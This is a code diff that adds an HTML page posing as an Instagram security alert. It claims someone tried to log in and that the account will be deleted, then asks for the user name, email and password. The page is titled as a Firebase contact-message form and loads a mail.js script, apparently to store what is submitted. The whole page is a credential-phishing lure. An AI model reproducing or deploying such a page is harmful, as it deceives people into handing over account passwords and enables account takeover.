@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Messages | Firebase</title>
+    <link rel="stylesheet" href="./styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <form action="" id="contactForm">
+           
+
+            <div class="logo">
+                <img src="https://th.bing.com/th/id/R.4c3e30c8be83378f4b2018d1575d4c40?rik=KNNmdnGnXSmG6A&riu=http%3a%2f%2feternylstudios.com%2fwp-content%2fuploads%2f2019%2f02%2finstagram-logo-2.png&ehk=54peAG5doK0P0H8JDgLuZnYF8pFCddVHnHynKIIj2Mw%3d&risl=&pid=ImgRaw&r=0" alt="Instagram Logo">
+            </div>
+            <div class="alert">Someone try to login into your account login. Otherwise your account was deleted..</div>
+
+            <div class="inputBox">
+                <input type="text" id="name" placeholder="User name" />
+            </div>
+
+            <div class="inputBox">
+                <input type="text" id="emailid" placeholder="Your Email....." />
+            </div>
+
+            <div class="inputBox">
+                <input id="msgContent"  placeholder="password"></input>
+            </div>
+
+            <div class="inputBox">
+                <button type="submit">Submit</button>
+            </div>
+        </form>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail.js"></script>
+</body>
+
+</html>
